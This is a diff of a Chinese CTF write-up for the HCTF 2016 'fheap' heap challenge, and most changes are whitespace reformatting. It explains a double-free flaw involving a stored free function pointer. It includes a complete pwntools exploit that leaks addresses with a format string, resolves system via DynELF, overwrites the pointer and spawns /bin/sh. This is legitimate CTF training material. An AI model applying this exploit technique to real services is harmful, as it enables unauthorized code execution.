@@ -17,8 +17,8 @@ strip fheap
 
 <ol>
 	<li> create string
-        <li> delete string
-        <li> quit
+		<li> delete string
+		<li> quit
 </ol>
 
 > 1. 选择`create string`, 输入size, content.
@@ -32,17 +32,17 @@ strip fheap
 结构体:
 ```
 typedef struct String{
-    union {
-        char *buf;			//输入的字符串大小>16, 地址付给buf
-        char array[16];     		//输入的字符串大小<16, 存放在array中
-    } o;
-    int len;
-    void (*free)(struct String *ptr); //存放的free函数的地址, delete时使用
+	union {
+		char *buf;			//输入的字符串大小>16, 地址付给buf
+		char array[16];     		//输入的字符串大小<16, 存放在array中
+	} o;
+	int len;
+	void (*free)(struct String *ptr); //存放的free函数的地址, delete时使用
 } String;
 
 struct {
-    int inuse;
-    String *str;
+	int inuse;
+	String *str;
 } Strings[0x10];
 ```
 > **1. `create string `**
@@ -56,15 +56,15 @@ struct {
 > **2. `delete string`**
 ```
 关键代码:
-    if (Strings[id].str) {
+	if (Strings[id].str) {
 		printf("Are you sure?:");
 		read(STDIN_FILENO,buf,0x100);
 		if(strncmp(buf,"yes",3)) {
 			return;
 		}
-        Strings[id].str->free(Strings[id].str);
-        Strings[id].inuse = 0;
-    }
+		Strings[id].str->free(Strings[id].str);
+		Strings[id].inuse = 0;
+	}
 ```
 存在`double free`漏洞: `fastbin`维护的`chunk`大小从32~128字节, 假定我们执行一下过程.
 ```
@@ -156,92 +156,92 @@ DEBUG = 1
 # context(log_level='debug')
 # context.log_level = 'debug'
 if DEBUG:
-     p = process('./fheap')
+	 p = process('./fheap')
 else:
-     r = remote('172.16.4.93', 13025)
+	 r = remote('172.16.4.93', 13025)
 
 print_plt=0
 
 def create(size,content):
-    p.recvuntil("quit")
-    p.send("create ")
-    p.recvuntil("size:")
-    p.sendline(str(size))
-    p.recvuntil('str:')
-    p.send(content.ljust(size,'\x00'))
-    p.recvuntil('n')[:-1]
+	p.recvuntil("quit")
+	p.send("create ")
+	p.recvuntil("size:")
+	p.sendline(str(size))
+	p.recvuntil('str:')
+	p.send(content.ljust(size,'\x00'))
+	p.recvuntil('n')[:-1]
 
 def delete(idx):
-    p.recvuntil("quit")
-    p.sendline("delete ")
-    p.recvuntil('id:')
-    p.send(str(idx)+'\n')
-    p.recvuntil('sure?:')
-    p.send('yes '+'\n')
+	p.recvuntil("quit")
+	p.sendline("delete ")
+	p.recvuntil('id:')
+	p.send(str(idx)+'\n')
+	p.recvuntil('sure?:')
+	p.send('yes '+'\n')
 
 def leak(addr):
-    delete(0)
-    data = 'aa%9$s' + '#'*(0x18 - len('aa%9$s')) + p64(print_plt)
-    create(0x20, data)
-    p.recvuntil("quit")
-    p.send("delete ")
-    p.recvuntil('id:')
-    p.send(str(1) + '\n')
-    p.recvuntil('sure?:')
-    p.send('yes01234' + p64(addr))
-    p.recvuntil('aa')
-    data = p.recvuntil('####')[:-4]
-    data += "\x00"
-    return data
+	delete(0)
+	data = 'aa%9$s' + '#'*(0x18 - len('aa%9$s')) + p64(print_plt)
+	create(0x20, data)
+	p.recvuntil("quit")
+	p.send("delete ")
+	p.recvuntil('id:')
+	p.send(str(1) + '\n')
+	p.recvuntil('sure?:')
+	p.send('yes01234' + p64(addr))
+	p.recvuntil('aa')
+	data = p.recvuntil('####')[:-4]
+	data += "\x00"
+	return data
 
 def pwn():
-    global print_plt
+	global print_plt
 
-    create(4,'aa')
-    create(4,'bb')
-    create(4,'cc')   
-    delete(2)
-    delete(1)
-    delete(0)
+	create(4,'aa')
+	create(4,'bb')
+	create(4,'cc')   
+	delete(2)
+	delete(1)
+	delete(0)
 
-    data='a' * 0x10 + 'b' * 0x8 + '\x2d' + '\x00'
-    create(0x20, data)
-    delete(1)
-    p.recvuntil('b' * 0x8)
-    data = p.recvline()[:-1]
+	data='a' * 0x10 + 'b' * 0x8 + '\x2d' + '\x00'
+	create(0x20, data)
+	delete(1)
+	p.recvuntil('b' * 0x8)
+	data = p.recvline()[:-1]
 
-    if len(data) > 8:
-        data = data[:8]
-    data=u64(data.ljust(8,'\x00'))
-    proc_base = data - 0xd2d
-    print "proc base", hex(proc_base)
-    print_plt = proc_base + 0x9d0
+	if len(data) > 8:
+		data = data[:8]
+	data=u64(data.ljust(8,'\x00'))
+	proc_base = data - 0xd2d
+	print "proc base", hex(proc_base)
+	print_plt = proc_base + 0x9d0
 
-    print "print plt", hex(print_plt)
-    delete(0)
+	print "print plt", hex(print_plt)
+	delete(0)
 
 
-    #part2
-    data='a' * 0x10 + 'b'*0x8 +'\x2D'+'\x00'
-    create(0x20, data)
-    gdb.attach(p)
-    delete(1)
-    p.recvuntil('b'*0x8)
-    data = p.recvline()[:-1]
+	#part2
+	data='a' * 0x10 + 'b'*0x8 +'\x2D'+'\x00'
+	create(0x20, data)
+	gdb.attach(p)
+	delete(1)
+	p.recvuntil('b'*0x8)
+	data = p.recvline()[:-1]
 #    gdb.attach(p)
-    d = DynELF(leak, proc_base, elf=ELF('./fheap'))
-    system_addr = d.lookup('system', 'libc')
-    print "system_addr:", hex(system_addr)
+	d = DynELF(leak, proc_base, elf=ELF('./fheap'))
+	system_addr = d.lookup('system', 'libc')
+	print "system_addr:", hex(system_addr)
 
-    #part3
-    delete(0)
-    data='/bin/sh;' + '#' * (0x18 - len('/bin/sh;')) + p64(system_addr)
-    create(0x20, data)
-    delete(1)
-    p.interactive()
+	#part3
+	delete(0)
+	data='/bin/sh;' + '#' * (0x18 - len('/bin/sh;')) + p64(system_addr)
+	create(0x20, data)
+	delete(1)
+	p.interactive()
 
 if __name__ == '__main__':
-    pwn()
+	pwn()
 ```
 ### 心得
 > 这是我第一次接触堆方面的题, 说实话这个过程实在很苦. 
@@ -255,3 +255,4 @@ if __name__ == '__main__':
 2. [fast-bin内存机制的利用探究](https://cartermgj.github.io/2016/12/01/Hctf-jiushigan/) (调试新方法, 针对地址随机化)
 3. [hctf2016 fheap学习(FreeBuf发表的官方解法)](http://www.cnblogs.com/shangye/p/6156391.html) (知识点较全)
 4. [HCTF开源Github](https://github.com/vidar-team/HCTF2016)
+5. [相关文件下载](https://github.com/BBS-Bill-Gates/CTF/tree/master/2016/HCTF/fheap)
